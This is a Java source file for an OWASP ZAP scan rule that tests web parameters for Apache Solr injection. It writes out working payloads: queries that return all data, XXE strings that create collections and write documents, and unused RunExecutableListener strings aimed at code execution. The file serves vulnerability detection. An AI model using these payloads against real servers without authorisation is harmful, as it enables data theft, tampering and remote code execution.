package org.zaproxy.zap.extension.ascanrulesAlpha;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import org.apache.log4j.Logger;
import org.parosproxy.paros.Constant;
import org.parosproxy.paros.core.scanner.AbstractAppParamPlugin;
import org.parosproxy.paros.core.scanner.Alert;
import org.parosproxy.paros.core.scanner.Category;
import org.parosproxy.paros.network.HttpMessage;
import org.zaproxy.zap.model.Tech;

/**
 * The SolrInjection plugin identifies Solr injection vulnerabilities
 *
 * @author LuigiCasciaro
 */
public class SolrInjection extends AbstractAppParamPlugin {

	private static final Tech SOLR_TECH = Tech.Db /* TODO Tech.Solr */;
	private static final String MESSAGE_PREFIX = "ascanalpha.solr.";
	private static final String ALL_DATA_ATTACK = "alldata";
	private static final String XXE_ATTACK = "xxe";
	private static final String INJECTED_COLLECTION = "collectioninjected";
	private static final String DEFAULT_COLLECTION = "gettingstarted";
	private static final String INJECTED_LISTENER = "injectedlistener";
	private static final String UNKOWN_HOST_TOKEN = "http://_z<>a<>p<>.com	";
	private static final String CASUAL_TOKEN = "{987987987zapPenentrationTest123123123 *";
	
	// Packets of attack rules 
	private static final String[] ALL_DATA_INJECTION = {"{! rows=10} *", "*", "[* TO *]", "(1 OR *)"};
	private static final String[] XXE_INJECTION = { 
		"{!xmlparser v=\'<!DOCTYPE a SYSTEM \""+UNKOWN_HOST_TOKEN+"\"><a></a>\'}",
		//create a new collection
		"{!xmlparser v='<!DOCTYPE a SYSTEM \"http://localhost:8983/solr/admin/collections?action=CREATE&name="+
		INJECTED_COLLECTION+"&numShards=2\"><a></a>'}",
		"{!xmlparser v='<!DOCTYPE a SYSTEM \"http://localhost:8983/solr/"+DEFAULT_COLLECTION+"/update?stream.body="
		+ "[{\"id\":\"AAA\"}]&commit=true&overwrite=true\"><a></a>'}"		
	};
	//TODO: implement the penetration test for these rules
	private static final String[] CODE_EXECUTION_INJECTION = {
		"{!xmlparser v='<!DOCTYPE a SYSTEM \"http://localhost:8983/solr/"+INJECTED_COLLECTION+"/select?q=xxx&qt=/solr/"
		+INJECTED_COLLECTION+"/config?stream.body={\"add-listener\":{\"event\":\"postCommit\",\"name\":\""
		+INJECTED_LISTENER+"\",\"class\":\"solr.RunExecutableListener\"}}&shards=localhost:8983/\"><a></a>'}",
		"{!xmlparser v='<!DOCTYPE a SYSTEM \"http://localhost:8983/solr/"+DEFAULT_COLLECTION+"/select?q=xxx&qt=/solr/"
		+DEFAULT_COLLECTION+"/config?stream.body={\"add-listener\":{\"event\":\"postCommit\",\"name\":\""
		+INJECTED_LISTENER+"\",\"class\":\"solr.RunExecutableListener\",\"exe\":\"\"}}&shards=localhost:8983/\"><a>"
		+ "</a>'}"
	};

	private  final Pattern[] errorPatterns = {
			Pattern.compile("document type declaration must be well-formed", Pattern.CASE_INSENSITIVE),
			Pattern.compile("Error parsing XML stream:java.net.UnknownHostException", Pattern.CASE_INSENSITIVE),
			Pattern.compile("ConnectException: Connection refused", Pattern.CASE_INSENSITIVE) };
	
	private static final Logger LOG = Logger.getLogger(SolrInjection.class);

	@Override
	public int getId() {
		return 40034;
	}
	
	@Override
	public int getCweId() {
		return 943;
	}

	@Override
	public int getWascId() {
		return 19;
	}

	@Override
	public String getName() {
		return Constant.messages.getString(MESSAGE_PREFIX + "name");
	}

	@Override
	public String getDescription() {
		return Constant.messages.getString(MESSAGE_PREFIX + "desc");
	}

	@Override
	public int getCategory() {
		return Category.INJECTION;
	}

	@Override
	public String getSolution() {
		return Constant.messages.getString(MESSAGE_PREFIX + "soln");
	}

	@Override
	public String getReference() {
		return Constant.messages.getString(MESSAGE_PREFIX + "refs");
	}

	@Override
	public String[] getDependency() {
		return new String[] {};
	}
	
	public String getExtraInfo(String attack) {
		return Constant.messages.getString(MESSAGE_PREFIX + "extrainfo." + attack);
	}

	@Override
	public void scan(HttpMessage msg, String param, String value) {
		
		if(!inScope(SOLR_TECH)) {
			return;
		}
		if (LOG.isDebugEnabled()) {
			LOG.debug("Scannning URL ["+msg.getRequestHeader().getMethod()+"] ["+msg.getRequestHeader().getURI()+
					"] on param: ["+param+"] with value: ["+value+"] for Solr Injection");
		}
		try {
			// Test if it is permitted to get all (or an arbitrary number) of data
			for(String injectedValue : ALL_DATA_INJECTION) {
				if(isStop()) {
					if (LOG.isDebugEnabled()) { LOG.debug("Stopping the scan due to a user request"); }
					return;
				}
				if (LOG.isDebugEnabled()) {
					LOG.debug("\nTrying with the value: "+injectedValue+" for the \""+ALL_DATA_ATTACK+"\" attack");
				}
				msg = getNewMsg();
				setParameter(msg, param, injectedValue);
				sendAndReceive(msg);		
				if(!getBaseMsg().getResponseBody().toString().equals(msg.getResponseBody().toString())) {
					//make sure that isn't a false positive
					HttpMessage verificationMsg = getNewMsg();
					setParameter(verificationMsg, param, CASUAL_TOKEN);
					sendAndReceive(verificationMsg);
					if(!msg.getResponseBody().toString().equals(verificationMsg.getResponseBody().toString())){
						bingo(Alert.RISK_MEDIUM, Alert.CONFIDENCE_MEDIUM, getName(), getDescription(), null, param, 
								injectedValue, getExtraInfo(ALL_DATA_ATTACK), getSolution(), msg);
						return;
					}
				}
			}
			for(String injectedValue : XXE_INJECTION) {
				if(isStop()) {
					if (LOG.isDebugEnabled()) { LOG.debug("Stopping the scan due to a user request"); }
					return;
				}
				if (LOG.isDebugEnabled()) {
					LOG.debug("\nTrying with the value: "+injectedValue+" for the \""+XXE_ATTACK+"\" attack");
				}
				msg = getNewMsg();
				setParameter(msg, param, injectedValue);
				sendAndReceive(msg);		
				if(!getBaseMsg().getResponseBody().toString().equals(msg.getResponseBody().toString())) {
					/*for(String m:SOLR_ERROR_MATCHING) {
						if(bodyMsgInjected.contains(m)) {
							bingo(Alert.RISK_HIGH, Alert.CONFIDENCE_HIGH, getName(), getDescription(), null, param, 
								injectedValue, getExtraInfo(typeAttack), getSolution(), msg);
							break;
						}
					}*/
					for(Pattern pattern : errorPatterns) {
						Matcher matcher =  pattern.matcher(msg.getResponseBody().toString());
						if(matcher.find()) {
							bingo(Alert.RISK_HIGH, Alert.CONFIDENCE_HIGH, getName(), getDescription(), null, param, 
									injectedValue, getExtraInfo(XXE_ATTACK), getSolution(), msg);
							break;
						}
					}
				}
			}
		} catch (IOException ex) {
			if (LOG.isDebugEnabled()) {
				LOG.debug("Caught " + ex.getClass().getName() + " " + ex.getMessage() +
						" when try to send an http message");
			}
		}
	}
}